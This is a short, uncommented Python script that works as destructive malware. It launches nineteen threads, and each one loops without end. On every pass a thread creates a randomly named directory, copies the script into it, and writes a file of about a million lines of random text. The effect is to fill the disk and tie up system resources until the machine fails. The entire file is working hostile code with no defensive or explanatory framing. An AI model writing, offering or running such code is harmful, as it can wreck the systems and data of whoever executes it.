import sys
import os
import random
import string
import subprocess
import threading

SCRIPT = sys.argv
NAME = str(SCRIPT[0])

def RANDOM_(Length):
	Letters_ = string.ascii_lowercase
	return ''.join(random.choice(Letters_) for i in range(Length))

def NEW_():
	FILE_NAME_1 = RANDOM_(32)
	FILE_NAME_2 = RANDOM_(32)
	FILE_NAME_3 = RANDOM_(32)
	FILE_NAME_4 = RANDOM_(32)
	FileName = FILE_NAME_1 + FILE_NAME_2 + FILE_NAME_3 + FILE_NAME_4

	File_ = open(FileName, "w+")

	TEXT_1 = RANDOM_(32)
	TEXT_2 = RANDOM_(32)
	TEXT_3 = RANDOM_(32)
	TEXT_4 = RANDOM_(32)
	TEXT_5 = RANDOM_(32)
	TEXT_6 = RANDOM_(32)

	TEXT_CONTENT = TEXT_1 + TEXT_2 + TEXT_3 + TEXT_4 + TEXT_5 + TEXT_6

	for i in range(1000000):
		File_.write(TEXT_CONTENT + "asd%d\r\n")

	File_.close()

class Pink(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)



	def run(self):
		Bool = False
		while True:
			if Bool == False:								
				subprocess.call(['mkdir', 'logs'])
				Bool = True

			else:

				DIR_NAME_P1 = RANDOM_(32)
				DIR_NAME_P2 = RANDOM_(32)
				DIR_NAME_P3 = RANDOM_(32)
				DIR_NAME_P4 = RANDOM_(32)

				DirectoryName = DIR_NAME_P1+ DIR_NAME_P2 + DIR_NAME_P3 + DIR_NAME_P4
				subprocess.call(['mkdir', DirectoryName])
				subprocess.call(['cp', NAME, DirectoryName])

				NEW_()

ThreadA = Pink()
ThreadB = Pink()
ThreadC = Pink()
ThreadD = Pink()
ThreadE = Pink()
ThreadF = Pink()
ThreadG = Pink()
ThreadH = Pink()
ThreadJ = Pink()
ThreadK = Pink()
ThreadL = Pink()
ThreadM = Pink()
ThreadN = Pink()
ThreadO = Pink()
ThreadP = Pink()
ThreadR = Pink()
ThreadS = Pink()
ThreadT = Pink()
ThreadU = Pink()

ThreadA.start()
ThreadB.start()
ThreadC.start()
ThreadD.start()
ThreadE.start()
ThreadF.start()
ThreadG.start()
ThreadH.start()
ThreadJ.start()
ThreadK.start()
ThreadL.start()
ThreadM.start()
ThreadN.start()
ThreadO.start()
ThreadP.start()
ThreadR.start()
ThreadS.start()
ThreadT.start()
ThreadU.start()
